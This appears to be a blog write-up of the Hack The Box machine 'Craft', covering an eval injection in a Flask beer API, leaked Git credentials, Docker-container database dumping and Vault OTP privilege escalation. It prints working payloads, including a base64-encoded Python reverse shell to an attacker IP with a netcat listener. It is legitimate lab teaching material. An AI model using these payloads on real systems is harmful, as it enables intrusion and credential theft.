---
title: "HTB - Craft"
date: 2026-03-14
draft: false
tags: ["htb", "linux", "gogs", "api", "eval", "rce", "vault", "otp", "medium"]
ctf: "Hack The Box"
difficulty: "Medium"
---

> Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using Vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root.

Recently I got interested in **Application Programming Interface** (API) hacking. We see over and over again that many organizations are heading towards APIs using independent microservices rather than staying as monolithic applications. This gives developers easier scalability and flexibility. However, with great power comes great responsibility and if APIs are misconfigured it will cause headaches for the companies.

While this post is a writeup focused on solving the **Craft** machine, I also give away some of my tips and tricks when it comes to *reconnaissance, API hacking and using Burp Suite efficiently*.

## Reconnaissance

As usual, I start by firing up nmap with the `-p-` flag to do a full port scan.

```
viv4ldi@ARCH4EA ~/Craft  nmap -sT -p- 10.129.1.188

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 13:16 +0100
Nmap scan report for 10.129.1.188
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
6022/tcp open  x11

Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds
```

Now that I know which ports are open, I can start another nmap scan to do full fingerprinting and version scanning on the open ports.

```
viv4ldi@ARCH4EA ~/Craft  nmap -sT -sV -sC -oA nmap/craft -p 22,443,6022 10.129.1.188

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 13:37 +0100
Nmap scan report for 10.129.1.188
Host is up (0.14s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
| tls-alpn:
|_  http/1.1
|_http-server-header: nginx/1.15.8
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey:
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.97 seconds
```

Looking at the results I see that 3 ports are open. The target listens on port 22 running SSH and looking at the banner `OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)` I see that I am dealing with a Debian machine.

Port 6022 particularly stands out compared to other machines. After some research I see that `x/crypto/ssh` is a package written in Go to implement an SSH client and server.

I use netcat to interact with it as low-level as possible and indeed I see that we are dealing with a Go SSH instance.

![nc to port 6022](/images/ctf/craft/01nc_port_6022.png)

I also see that the target is hosting an Nginx web server on port 443. Visiting the web page I am greeted with a simple web page.

![Webpage](/images/ctf/craft/02webpage.png)

Using Firefox I view the certificate in search of any valuable information disclosure.

![Certificate in Firefox](/images/ctf/craft/03ssl_cert.png)

Looking at the details we find a domain name `craft.htb` and an email address `admin@craft.htb`.

We can also use our good old terminal to view the same information, because why not. The following command will check connectivity on the target host and view certificate details for a website.

```
viv4ldi@ARCH4EA ~/Craft  openssl s_client -connect 10.129.1.188:443 -showcerts

Connecting to 10.129.1.188
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C=US, ST=NY, O=Craft, CN=craft.htb
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 C=US, ST=NY, O=Craft, CN=craft.htb
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 C=US, ST=NY, O=Craft, CN=craft.htb
verify error:num=10:certificate has expired
notAfter=Jun 20 02:25:47 2020 GMT
verify return:1
depth=0 C=US, ST=NY, O=Craft, CN=craft.htb
notAfter=Jun 20 02:25:47 2020 GMT
verify return:1
---
Certificate chain
 0 s:C=US, ST=NY, O=Craft, CN=craft.htb
   i:C=US, ST=New York, L=Buffalo, O=Craft, OU=Craft, CN=Craft CA, emailAddress=admin@craft.htb
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Feb  6 02:25:47 2019 GMT; NotAfter: Jun 20 02:25:47 2020 GMT
-----BEGIN CERTIFICATE-----
MIIEQDCCAigCCQC6e7PJjcRLnzANBgkqhkiG9w0BAQsFADCBhTELMAkGA1UEBhMC
VVMxETAPBgNVBAgMCE5ldyBZb3JrMRAwDgYDVQQHDAdCdWZmYWxvMQ4wDAYDVQQK
DAVDcmFmdDEOMAwGA1UECwwFQ3JhZnQxETAPBgNVBAMMCENyYWZ0IENBMR4wHAYJ
KoZIhvcNAQkBFg9hZG1pbkBjcmFmdC5odGIwHhcNMTkwMjA2MDIyNTQ3WhcNMjAw
NjIwMDIyNTQ3WjA+MQswCQYDVQQGEwJVUzELMAkGA1UECAwCTlkxDjAMBgNVBAoM
BUNyYWZ0MRIwEAYDVQQDDAljcmFmdC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQDV6vf1Ki4fZhJeMOQBAUFx98hM70l6Hpu+4MlB4++i/u2fKRvV
<SNIP>
```

After interacting with the application, I find 2 different domains other than `craft.htb`: `api.craft.htb` and `gogs.craft.htb`. To interact with them I add the entries at the end of my `/etc/hosts` file.

![/etc/hosts](/images/ctf/craft/04hosts_file.png)

I browse to `https://craft.htb` and the page seems to be the same as before.

![craft.htb](/images/ctf/craft/05craft_htb.png)

Browsing to `https://gogs.craft.htb` I am faced with a Gogs instance.

![gogs.craft.htb](/images/ctf/craft/06gogs.png)

Gogs (Go Git Service) is a self-hosted Git service written in Go, designed for simplicity, stability, and low resource usage. Even though it is advertised as painless, if misconfigured it can disclose very valuable information that can affect the organization. We see version `0.11.86.0130` is in use which is quite old. Most organizations will try to hide version numbers, however a close guess can be made by looking at the copyright information.

![Copyright info](/images/ctf/craft/07gogs_copyright.png)

The above image shows the copyright year 2018, which could still help us make a close guess when searching for vulnerabilities online.

Whenever I am assessing a web application, whether it is a Bug Bounty or CTF, I also like to create a map of the tech stack to gain a bit of perspective on how the developers built the application. Knowing which technologies and programming languages are in use (Go in this instance) will help us understand why they might have been chosen and thus understand the purpose of the application better.

Anyway, back to the Git instance. Going to the *Sign In* tab we see that public registration is disabled, but if misconfigured or there is no rate limiting it can allow for bruteforcing or password spraying of employee accounts. Visiting *Explore* (always a gold mine of information for adversaries if misconfigured) we see there is a publicly available repository called `craft-api`.

![craft-api repository](/images/ctf/craft/08craft_api_repo.png)

Viewing *Users* I see our crew from Silicon Valley :D

![Silicon Valley users](/images/ctf/craft/09silicon_valley_users.png)

At this point I clone the repository for further analysis. Here you need to set `GIT_SSL_NO_VERIFY=true` to bypass the SSL verification errors.

```
viv4ldi@ARCH4EA ~/Craft  GIT_SSL_NO_VERIFY=true git clone https://gogs.craft.htb/Craft/craft-api.git

Cloning into 'craft-api'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (41/41), done.
remote: Total 45 (delta 10), reused 0 (delta 0)
Unpacking objects: 100% (45/45), 7.25 KiB | 1.81 MiB/s, done.
```

![git clone](/images/ctf/craft/10git_clone.png)

It is written in Python and uses Flask. Before starting to read the source code I head to `https://api.craft.htb` to see what we are dealing with.

![Swagger API](/images/ctf/craft/11swagger.png)

A simple Swagger API related to beer. Living in Belgium for all these years I am not surprised seeing an API fully dedicated to beer.

I investigate the authentication mechanism and it seems HTTP Basic Authentication is in use, asking for a username and password. I try credentials like `admin:admin` or `admin:password` but it fails.

> **Tip for Burp Suite users: dealing with encoded parameters**
> Whenever you are dealing with encoded parameters, whether they are in the body or headers, Burp Suite has a useful feature under the *Inspector* tab in *Repeater* that lets you change the value while automatically handling the encoding. Basic Authentication happens through the **Authorization** header where credentials are provided in `<USERNAME>:<PASSWORD>` format as base64. So if you want to try the credentials `admin` and `password` you can highlight the base64 encoded value and under **Decoded from** write the credentials you want, click **Apply changes**, and Burp will perform the encoding automatically.

![Burp Basic Auth tip](/images/ctf/craft/12burp_basic_auth.png)

> **Tip for Burp Suite users: parsing Swagger docs**
> There is an extension called OpenAPI Parser on Burp Suite (available on the BApp store) that lets you parse Swagger documents. This is especially handy when testing API applications that have available OpenAPI documentation. To use it, simply download the documentation at `https://api.craft.htb/api/swagger.json` and load it under the OpenAPI Parser extension tab. This will immediately give us a clear map of the API.

![OpenAPI Parser](/images/ctf/craft/13openapi_parser.png)

After that I want to test what API calls are available for unauthenticated users. I do a simple `GET` request to the brew endpoint and it successfully fetches multiple brews based on the parameters.

![GET brew](/images/ctf/craft/14get_brew.png)

However, as expected, trying something like creating a new brew through `POST`, updating an existing brew through `PUT`, or deleting a brew through `DELETE` fails due to a missing token.

![Auth required](/images/ctf/craft/15auth_required.png)

Now that I have interacted with the API a little, I decide to read the source code to find vulnerabilities in the implementation.

Investigating the authentication and authorization flow, I see that upon a successful login through HTTP Basic Authentication the server will provide us with a JWT token using the secret in the Flask settings. To know more about JWT attacks refer to my post on [HTB CriticalOps](https://yusufsaka007.github.io/ctf/htb-criticalops/).

![Auth flow in source](/images/ctf/craft/16auth_flow.png)
![JWT token response](/images/ctf/craft/17jwt_token.png)

Looking at `brew.py` I see that upon creating a new brew the validity check of the `abv` parameter happens inside `eval`.

![brew.py eval](/images/ctf/craft/18brew_py_eval.png)

In Python, `eval()` is a built-in function that evaluates a string as a Python expression and returns the resulting value. If user input is not sanitized, one can craft a payload that results in remote code execution (RCE) on the server. However, to create a new brew we need a valid token.

Looking at Issues in the Gogs instance I see that this had been discussed before and, as expected, Gilfoyle already foresaw something bad was about to happen :D

![Gogs issue](/images/ctf/craft/19gogs_issue.png)

Going through some of the commits I find valid credentials for the user Dinesh. If you manually type a password, API key, or private key into a source file and commit it, that secret is now permanently part of the Git history. Deleting the file in a later commit won't help. Anyone who clones the repo can still browse previous commits to find the secret. As of today, this is still one of the most common mistakes made by developers.

![Credentials in commit](/images/ctf/craft/20dinesh_credentials.png)

I try out the credentials in Burp Suite and thanks to Dinesh I now have a valid token.

![Valid token](/images/ctf/craft/21valid_token.png)

Using the token with the `X-Craft-Api-Token` header I was able to create a new brew.

![Create brew with token](/images/ctf/craft/22create_brew.png)

However, even though creating a new IPA entry is cool and fun, we as hackers will want more.

## Initial Foothold

Now that I know whatever I put in the `abv` parameter will be evaluated as a Python expression, I can send a simple payload that will make the server sleep for 10 seconds. Since `eval` only evaluates one expression at a time, we can use Python's built-in `__import__` functionality to generate more advanced payloads.

I try the following payload and voila, we get our RCE ;).

```json
{
  "id": 1000,
  "brewer": "test",
  "name": "test",
  "style": "test",
  "abv":"__import__('os').system('sleep 10')"
}
```

![RCE with sleep 10](/images/ctf/craft/23rce_sleep.png)

Now that I've validated command execution, I want to get a shell on the target machine.

A great place for generating reverse shell payloads is [revshells](https://www.revshells.com/). We know the target OS and we also know that Python is available.

The good thing about **Reverse Shell Generator** is that you can insert your IP and port and it will automatically adapt the payload based on the values you provide.

![revshells.com](/images/ctf/craft/24revshells.png)

Whenever I am dealing with complex payloads like this, I always use base64 to avoid encoding issues. I simply paste the command into the **Decoder** tab in Burp Suite Pro and choose **Encode as Base64**.

![Base64 in Burp](/images/ctf/craft/25base64_burp.png)

Now I start a netcat listener on port 4444:

```bash
nc -nvlp 4444
```

Sending the following payload:

```json
{
  "id": 1000,
  "brewer": "test",
  "name": "test",
  "style": "test",
  "abv":"__import__('os').system('echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjU0Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc= | base64 -d | sh')"
}
```

![Payload sent](/images/ctf/craft/26payload_sent.png)

We got our shell.

![Shell received](/images/ctf/craft/27shell_received.png)

Here one can easily get excited seeing that we have `root`. So easy right? Well, being experienced on Hack The Box, I immediately realize that we are in a Docker environment. The `.dockerenv` file on `/` and the hostname both validate my suspicions.

![.dockerenv and hostname](/images/ctf/craft/28docker_env.png)

## Docker Escape

At this stage I start looking for a Docker escape. To get a more interactive shell I run the following:

```bash
export TERM=xterm
```

Then using Ctrl+Z I put the shell in the background and run:

```bash
stty raw -echo;fg
```

Then going through the source code, I find the Flask settings file which has the database credentials.

![Flask settings](/images/ctf/craft/29flask_settings.png)

Here I modify `dbtest.py` under `/opt/app` to fetch all users in the database using `vi`.

![dbtest.py modified](/images/ctf/craft/30dbtest_modified.png)

And we successfully dumped our Silicon Valley friends' passwords.

![Users from DB](/images/ctf/craft/31db_users.png)

At this stage I try SSHing into the target machine but it fails.

![SSH fail](/images/ctf/craft/32ssh_fail.png)

However, I succeed in logging in to Gilfoyle's account on the Gogs instance.

![Gilfoyle's Gogs account](/images/ctf/craft/33gilfoyle_gogs.png)

Going through his private repository I find his SSH keys.

![SSH keys in repo](/images/ctf/craft/34ssh_keys.png)

I copy the key, set the appropriate permissions, provide the password we found in the database as the passphrase, and we have SSH access as Gilfoyle along with the user flag.

![SSH as Gilfoyle and user flag](/images/ctf/craft/35ssh_gilfoyle_flag.png)

## Privilege Escalation

Before running tools like `linpeas` I usually look out for low-hanging fruits like misconfigured sudo privileges, unusual listening ports, uncommon files, etc.

Running `ls -la` on Gilfoyle's home shows the file `.vault-token`.

![.vault-token file](/images/ctf/craft/36vault_token_file.png)

Looking at his private repository I find multiple files related to Vault.

![Vault files in repo](/images/ctf/craft/37vault_repo_files.png)
![Vault secrets file](/images/ctf/craft/38vault_secrets.png)

It seems that he configured [Vault](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html) to manage SSH logins.

Looking at `secrets.sh` I see that the default user is set to root with key type being *One-time password (OTP)*.

After looking at the documentation I find we can automate the whole process using `vault`.

![Vault documentation](/images/ctf/craft/39vault_docs.png)

Running the following command:

```bash
vault ssh -role root_otp -mode otp root@127.0.0.1
```

![Vault OTP](/images/ctf/craft/40vault_otp.png)

Gives us the **OTP** which, when provided as the password, gets us SSH as `root`.

![Root flag](/images/ctf/craft/41root_flag.png)
